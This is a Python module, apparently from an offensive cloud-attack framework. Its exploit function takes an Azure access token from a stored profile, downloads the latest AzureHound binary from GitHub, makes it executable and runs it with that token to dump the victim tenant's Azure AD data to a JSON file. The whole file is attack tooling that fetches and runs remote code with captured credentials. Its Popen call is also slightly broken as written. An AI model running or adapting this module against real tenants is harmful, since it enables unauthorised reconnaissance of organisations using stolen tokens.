import json
import os.path
from io import BytesIO
import zipfile

import requests

author = {
    "name": "gl4ssesbo1",
    "twitter": "https://twitter.com/gl4ssesbo1",
    "github": "https://github.com/gl4ssesbo1",
    "blog": "https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "none",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    }
}

global device_code_request_json

description = "This module will try to get as many information on the user's account on O365, based on the its privileges."
aws_command = "No cli command"

def exploit(profile, workspace):
    access_token = profile['azure_access_token']

    # --------------------------------------------------
    # Get user's Info
    # --------------------------------------------------
    try:
        azurehoundURLBulk = requests.get("https://api.github.com/repos/BloodHoundAD/AzureHound/releases/latest").json()['assets']
        for url in azurehoundURLBulk:
            if  "linux-amd64.zip" in url['browser_download_url'] and not ".sha256" in url['browser_download_url']:
                if not os.path.exists("./.downloads"):
                    os.mkdir("./.downloads")
                curdir = os.getcwd()

                os.chdir("./.downloads")
                print(os.listdir("."))
                r = requests.get(url['browser_download_url'], stream=True)
                z = zipfile.ZipFile(BytesIO(r.content))
                z.extractall()

                from subprocess import Popen, PIPE


                azurehoundCommand = f"chmod +x ./azurehound; ./azurehound --jwt {access_token} --json > jsondump.json"
                #os.popen("chmod +x ./azurehound")

                p = Popen(azurehoundCommand, stdout=PIPE)
                p.wait()
                result = p.communicate()[0]

                #result = os.popen(azurehoundCommand).read()
                print(result)
                os.chdir(curdir)

                return {
                    "Tool": {"Tool": "AzureHound", "Result": "Finished Successfully"}
                }

    except Exception as e:
        return {"error": str(e)}
